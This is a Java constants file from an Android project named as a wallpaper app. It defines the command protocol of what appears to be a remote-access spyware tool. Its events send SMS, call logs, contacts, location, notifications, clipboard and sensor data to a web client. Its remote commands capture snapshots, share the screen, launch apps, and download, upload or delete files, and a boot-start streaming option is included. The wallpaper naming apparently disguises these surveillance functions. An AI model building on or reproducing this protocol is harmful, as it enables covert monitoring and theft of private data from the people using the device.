package com.example.wallpaperapplication;

public class Constants {

    // ── Actions ────────────────────────────────────────────────────
    public static final String ACTION_MEDIA_PROJECTION_RESULT = "com.example.wallpaperapplication.MEDIA_PROJECTION_RESULT";
    public static final String ACTION_NOTIFICATION            = "com.example.wallpaperapplication.NOTIFICATION";
    public static final String ACTION_STOP_STREAMING          = "STOP_STREAMING";
    public static final String ACTION_FORCE_SYNC              = "com.example.wallpaperapplication.ACTION_FORCE_SYNC";
    public static final String ACTION_PERMISSION_ERROR        = "com.example.wallpaperapplication.PERMISSION_ERROR";
    public static final String ACTION_REQUEST_NOTIFICATIONS   = "com.example.wallpaperapplication.REQUEST_NOTIFICATIONS";

    // ── Extras ─────────────────────────────────────────────────────
    public static final String EXTRA_RESULT_CODE      = "resultCode";
    public static final String EXTRA_RESULT_DATA      = "resultData";
    public static final String EXTRA_APP_NAME         = "appName";
    public static final String EXTRA_TITLE            = "title";
    public static final String EXTRA_TEXT             = "text";
    public static final String EXTRA_NOTIFICATION_KEY = "notificationKey";

    // ── Signaling ─────────────────────────────────────────────────
    // Update this to your actual signaling server address before production use.
    // Examples: "http://192.168.1.20:3000" or "https://your-domain.example:3000"
    public static final String DEFAULT_SIGNALING_URL = "http://YOUR_SERVER_IP:3000";

    // ── Video Quality (Camera Streaming) ──────────────────────────
    public static final int VIDEO_WIDTH  = 640;
    public static final int VIDEO_HEIGHT = 480;
    public static final int VIDEO_FPS    = 15;

    // ── Video Quality (Screen Share) ──────────────────────────────
    public static final int SCREEN_WIDTH  = 1280;
    public static final int SCREEN_HEIGHT = 720;
    public static final int SCREEN_FPS    = 15;

    // ── Video Quality (Local Recording) ───────────────────────────
    public static final int REC_VIDEO_WIDTH   = 640;
    public static final int REC_VIDEO_HEIGHT  = 480;
    public static final int REC_VIDEO_FPS     = 15;
    public static final int REC_VIDEO_BITRATE = 2_000_000;

    // ── Preferences ───────────────────────────────────────────────
    public static final String PREF_SIGNALING_URL     = "signaling_url";
    public static final String PREF_STREAMING_ENABLED = "streaming_enabled";
    public static final String PREF_BOOT_ENABLED      = "boot_streaming_enabled";

    // ── Notification & IDs ────────────────────────────────────────
    public static final String CHANNEL_ID           = "streaming_channel";
    public static final int    NOTIFICATION_ID      = 1;
    public static final int    PERMISSION_REQUEST_CODE = 1;

    // ── Socket Events (Android → Web) ─────────────────────────────
    public static final String EVENT_WEB_CLIENT_READY = "web-client-ready";
    public static final String EVENT_SIGNAL            = "signal";
    public static final String EVENT_IDENTIFY          = "identify";
    public static final String EVENT_DEVICE_INFO       = "device_info";
    public static final String EVENT_LOCATION          = "location";
    public static final String EVENT_CALL_LOG          = "call_log";
    public static final String EVENT_SMS               = "sms";
    public static final String EVENT_NOTIFICATION      = "notification";
    public static final String EVENT_APPS              = "apps_list";
    public static final String EVENT_CONTACTS          = "contacts_list";

    // ── Command Events (Web → Android) ────────────────────────────
    public static final String CMD_PING               = "cmd:ping";
    public static final String CMD_STOP               = "cmd:stop";
    public static final String CMD_RECORD             = "cmd:record";
    public static final String CMD_CAMERA_SWITCH      = "cmd:camera_switch";
    public static final String CMD_SCREEN_SHARE       = "cmd:screen_share";
    public static final String CMD_GET_APPS           = "cmd:get_apps";
    public static final String CMD_GET_CONTACTS       = "cmd:get_contacts";
    public static final String CMD_SYNC_NOTIFICATIONS = "cmd:sync_notifications";
    public static final String CMD_VIBRATE            = "cmd:vibrate";
    public static final String CMD_TOAST              = "cmd:toast";
    public static final String CMD_OPEN_URL           = "cmd:open_url";
    public static final String CMD_FLASHLIGHT         = "cmd:flashlight";
    public static final String CMD_SET_VOLUME         = "cmd:set_volume";
    public static final String CMD_SET_BRIGHTNESS     = "cmd:set_brightness";
    public static final String CMD_RING_DEVICE        = "cmd:ring";
    public static final String CMD_SET_QUALITY        = "cmd:set_quality";
    public static final String CMD_SET_GPS_INTERVAL   = "cmd:set_gps_interval";
    public static final String CMD_LAUNCH_APP         = "cmd:launch_app";
    public static final String CMD_TOGGLE_SENSORS   = "cmd:toggle_sensors";
    public static final String CMD_GET_NETWORK      = "cmd:get_network";
    public static final String CMD_TAKE_SNAPSHOT    = "cmd:take_snapshot";
    public static final String CMD_GET_CLIPBOARD    = "cmd:get_clipboard";
    public static final String CMD_SET_CLIPBOARD    = "cmd:set_clipboard";
    public static final String EVENT_SENSOR_DATA    = "sensor_data";
    public static final String EVENT_NETWORK_INFO    = "network_info";
    public static final String EVENT_SNAPSHOT_DATA  = "snapshot_data";
    public static final String EVENT_CLIPBOARD_DATA  = "clipboard_data";

    // ── File System Events ─────────────────────────────────────────
    public static final String FS_LIST              = "fs:list";
    public static final String FS_FILES             = "fs:files";
    public static final String FS_DOWNLOAD          = "fs:download";
    public static final String FS_DOWNLOAD_START    = "fs:download_start";
    public static final String FS_DOWNLOAD_CHUNK    = "fs:download_chunk";
    public static final String FS_DOWNLOAD_COMPLETE = "fs:download_complete";
    public static final String FS_DOWNLOAD_ERROR    = "fs:download_error";
    public static final String FS_DELETE            = "fs:delete";
    public static final String FS_DELETE_RESULT     = "fs:delete_result";
    public static final String FS_UPLOAD_START      = "fs:upload_start";
    public static final String FS_UPLOAD_CHUNK      = "fs:upload_chunk";
    public static final String FS_UPLOAD_COMPLETE    = "fs:upload_complete";
    public static final int    FS_CHUNK_SIZE        = 64 * 1024; // 64 KB

    // ── Paths ──────────────────────────────────────────────────────
    public static final String ROOT_PATH = "/storage/emulated/0/";
}